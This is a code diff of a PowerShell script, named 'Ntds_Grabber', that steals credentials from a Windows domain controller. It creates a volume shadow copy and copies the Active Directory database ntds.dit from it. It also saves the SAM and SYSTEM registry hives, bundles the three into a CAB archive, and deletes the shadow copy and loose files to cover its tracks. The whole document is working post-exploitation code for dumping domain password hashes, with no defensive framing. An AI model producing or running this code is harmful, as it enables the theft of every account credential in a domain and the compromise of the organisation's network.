@@ -1,4 +1,6 @@
-function New-CabinetFile {
+function Ntds_Grabber()
+{
+    function New-CabinetFile {
     [CmdletBinding()]
     Param(
         [Parameter(HelpMessage="Target .CAB file name.", Position=0, Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
@@ -96,42 +98,45 @@ function New-CabinetFile {
         ## Return the newly created .CAB FileInfo object to the pipeline
         Get-Item (Join-Path $DestinationPath $Name);
     }
+    }
+
+    $key = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
+    $ntdsloc = (Get-ItemProperty -Path $key -Name "DSA Database file")."DSA Database file"
+    $ntdspath = $ntdsloc.split(":")[1]
+    $ntdsdisk = $ntdsloc.split(":")[0]
+
+    (Get-WmiObject -list win32_shadowcopy).create($ntdsdisk + ":\","ClientAccessible")
+
+    $id_shadow = "None"
+    $volume_shadow = "None"
+
+    if (!(Get-WmiObject win32_shadowcopy).length){
+        Write-Host "Only one shadow clone"
+        $id_shadow = (Get-WmiObject win32_shadowcopy).ID
+        $volume_shadow = (Get-WmiObject win32_shadowcopy).DeviceObject
+    } Else {
+        $n_shadows = (Get-WmiObject win32_shadowcopy).length-1
+        $id_shadow = (Get-WmiObject win32_shadowcopy)[$n_shadows].ID
+        $volume_shadow = (Get-WmiObject win32_shadowcopy)[$n_shadows].DeviceObject
+    }
+
+    $command = "cmd.exe /c copy "+ $volume_shadow + $ntdspath + " " + ".\ntds.dit"
+    iex $command
+
+    $command2 = "cmd.exe /c reg save HKLM\SYSTEM .\SYSTEM"
+    iex $command2
+
+    $command3 = "cmd.exe /c reg save HKLM\SAM .\SAM"
+    iex $command3
+
+    (Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy | Where-Object {$_.DeviceObject -eq $volume_shadow}).Delete()
+    if (Test-Path "All.cab"){
+       Remove-Item "All.cab" 
+    }
+    New-CabinetFile -Name All.cab -File "SAM","SYSTEM","ntds.dit"
+    Remove-Item ntds.dit
+    Remove-Item SAM
+    Remove-Item SYSTEM
+
 }
-
-$key = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
-$ntdsloc = (Get-ItemProperty -Path $key -Name "DSA Database file")."DSA Database file"
-$ntdspath = $ntdsloc.split(":")[1]
-$ntdsdisk = $ntdsloc.split(":")[0]
-
-(Get-WmiObject -list win32_shadowcopy).create($ntdsdisk + ":\","ClientAccessible")
-
-$id_shadow = "None"
-$volume_shadow = "None"
-
-if (!(Get-WmiObject win32_shadowcopy).length){
-    Write-Host "Only one shadow clone"
-    $id_shadow = (Get-WmiObject win32_shadowcopy).ID
-    $volume_shadow = (Get-WmiObject win32_shadowcopy).DeviceObject
-} Else {
-    $n_shadows = (Get-WmiObject win32_shadowcopy).length-1
-    $id_shadow = (Get-WmiObject win32_shadowcopy)[$n_shadows].ID
-    $volume_shadow = (Get-WmiObject win32_shadowcopy)[$n_shadows].DeviceObject
-}
-
-$command = "cmd.exe /c copy "+ $volume_shadow + $ntdspath + " " + ".\ntds.dit"
-iex $command
-
-$command2 = "cmd.exe /c reg save HKLM\SYSTEM .\SYSTEM"
-iex $command2
-
-$command3 = "cmd.exe /c reg save HKLM\SAM .\SAM"
-iex $command3
-
-(Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy | Where-Object {$_.DeviceObject -eq $volume_shadow}).Delete()
-if (Test-Path "All.cab"){
-   Remove-Item "All.cab" 
-}
-New-CabinetFile -Name All.cab -File "SAM","SYSTEM","ntds.dit"
-Remove-Item ntds.dit
-Remove-Item SAM
-Remove-Item SYSTEM
+Ntds_Grabber
